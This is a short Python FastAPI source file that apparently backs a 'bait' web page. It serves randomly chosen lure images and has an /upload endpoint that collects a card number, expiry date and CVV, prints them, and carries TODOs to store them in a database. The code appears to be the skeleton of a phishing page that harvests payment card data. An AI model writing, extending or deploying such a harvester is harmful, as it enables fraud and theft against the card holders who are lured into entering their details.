from random import choice

from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

from pydantic import BaseModel

class CreditCard(BaseModel):
    card_num: str
    expiry_date: str
    cvs: int

app = FastAPI()
app.mount(
    "/static",
    StaticFiles(directory="static"),
    name="static"
)

templates = Jinja2Templates(directory="templates")

bait_to_color = {
    'bait_img.png': '#81746f',
    'way_too_large.png': '#fec97b',
    'hoarse.png': '#d2c1f0',
    'bo.png': '#ffffff',
    'pink.png': "#f3bfd9",
}


@app.get("/", response_class=HTMLResponse)
async def main_page(request: Request):
    bait_img, background_color = choice(list(bait_to_color.items()))
    return templates.TemplateResponse(
        request=request,
        name="index.html",
        context={
            'background_color': background_color,
            'bait_img': bait_img,
        },
    )


@app.post("/upload")
async def upload_details(card_num, expiry, cvs):
    # TODO Validate Client side inputs
    credit_card = CreditCard(
        card_num=card_num,
        expiry_date=expiry,
        cvs=cvs,
    )
    # TODO Write Result to Database
    print(credit_card)
    # TODO Tell client about success maybe
    return
